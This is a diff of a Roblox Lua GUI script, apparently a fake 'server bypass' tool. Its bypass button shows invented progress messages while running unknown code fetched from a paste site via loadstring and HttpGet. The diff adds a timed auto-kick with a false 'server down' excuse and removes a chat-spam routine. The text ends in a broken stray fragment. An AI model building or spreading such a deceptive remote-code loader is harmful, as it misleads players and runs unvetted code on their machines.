@@ -1,8 +1,8 @@
 --// Roblox GUI Script with separate warning GUI
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
+local joinedTime = tick() -- record join time
 
 -- Main GUI
 local gui = Instance.new("ScreenGui")
@@ -72,7 +72,7 @@ local warnLabel = Instance.new("TextLabel")
 warnLabel.Size = UDim2.new(0.95, 0, 0.9, 0)
 warnLabel.Position = UDim2.new(0.025, 0, 0.05, 0)
 warnLabel.BackgroundTransparency = 1
-warnLabel.TextColor3 = Color3.new(0,0,0) -- black text
+warnLabel.TextColor3 = Color3.new(0,0,0) -- ✅ Warning text is black
 warnLabel.TextSize = 16
 warnLabel.TextWrapped = true
 warnLabel.Font = Enum.Font.GothamBold
@@ -84,22 +84,26 @@ local function showWarningMessage(msg)
     warnLabel.Text = msg
     warnFrame.Visible = true
     TweenService:Create(warnFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -200, 0.75, 0)}):Play()
-    task.delay(10, function()
+    task.delay(6, function()
         TweenService:Create(warnFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -200, 0.85, 0)}):Play()
-        task.delay(0.5, function() warnFrame.Visible = false end)
+        task.delay(0.5, function()
+            warnFrame.Visible = false
+        end)
     end)
 end
 
 -- BYPASS LOGIC
 bypassButton.MouseButton1Click:Connect(function()
-    if bypassButton.Text == "BYPASS COMPLETE 🟢" then return end
-
+    if bypassButton.Text == "BYPASS COMPLETE 🟢" then
+        return
+    end
+    
     bypassButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
-    bypassButton.Text = "BYPASSING... 🔴"
-    showWarningMessage("BYPASSING THE SERVER... IT WILL TAKE 10-15 MINS TO FULLY BYPASS THE SERVER. PLEASE BE PATIENT ⏳")
-
-    -- After 4 seconds load external script + smooth corners
-    task.delay(4, function()
+    bypassButton.Text = "BYPASSING... "
+    showWarningMessage("BYPASSING THE SERVER THIS MIGHT TAKE 10-13 MINS")
+    
+    -- Load external script after 3 sec
+    task.delay(3, function()
         loadstring(game:HttpGet("https://pastefy.app/9lPAOk2Y/raw"))()
         for _, obj in pairs(frame:GetDescendants()) do
             if obj:IsA("TextButton") or obj:IsA("Frame") then
@@ -109,18 +113,12 @@ bypassButton.MouseButton1Click:Connect(function()
             end
         end
     end)
-
-    -- After 15 minutes turn green
-    task.delay(900, function()
+    
+    -- Change button to green after 15 minutes (900 seconds)
+    task.delay(900, function() -- 900 sec = 15 min
         bypassButton.BackgroundColor3 = Color3.fromRGB(0,200,0)
         bypassButton.Text = "BYPASS COMPLETE 🟢"
         showWarningMessage("BYPASS COMPLETE! SCRIPT LOADED SUCCESSFULLY ✅")
-    end)
-
-    -- After 17 minutes failure + kick
-    task.delay(1020, function()
-        showWarningMessage("THE BYPASSING CANT BYPASS SERVER PLS TRY THIS SCRIPT AFTER FEW HOUR 😞")
-        LocalPlayer:Kick("PLS TRY AFTER FEW HOUR THE BYPASS SYSTEM IS DOWN")
     end)
 end)
 
@@ -134,40 +132,15 @@ tradeButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- CHAT COMMANDS
-LocalPlayer.Chatted:Connect(function(msg)
-    local args = string.split(msg, " ")
-    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-        and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
-
-    if args[1] == "!warn" then
-        local warnMsg = table.concat(args, " ", 2)
-        if warnMsg ~= "" then
-            showWarningMessage(warnMsg)
-        else
-            showWarningMessage("⚠️ Please provide a warning message after !warn")
+-- Auto kick after 20 minutes in server
+task.spawn(function()
+    while task.wait(60) do -- check every minute
+        local timeInServer = tick() - joinedTime
+        if timeInServer >= 1200 then -- 20 minutes (20*60)
+            showWarningMessage("WE CANT BUY THE SERVER FULLY PLS TRY ON NEW SERVER")
+            task.wait(4)
+            LocalPlayer:Kick("OUR SERVER IS DOWN PLS TRY AGAIN AFTER FEW HOUR")
+            break
         end
-
-    elseif msg == "!oldwarn" then
-        showWarningMessage("PLS DONT CLICK ON THE SCREEN FOR NO REASON IT WILL MAKE THE BYPASS TIME TAKE MORE!!")
-
-    elseif args[1] == "!say" then
-        if chatEvent then
-            task.spawn(function()
-                for i = 1, 100 do
-                    local messages = {
-                        "hii guys 🧠🔴",
-                        "skibidi toilet 🚽🎶",
-                        "rizz gyatt sigma 😈🔥",
-                        "fanum tax 💸",
-                        "brain rot activated 💀🎧"
-                    }
-                    local sayMsg = messages[(i-1) % #messages + 1]
-                    chatEvent:FireServer(sayMsg, "All")
-                    task.wait(3)
-                end
-            end)
-        else
-            showWarningMessage("⚠️ Chat system not found in this game, !say can't work here.")
-        end
-oxfruit-scripts/R
+    end
+end)
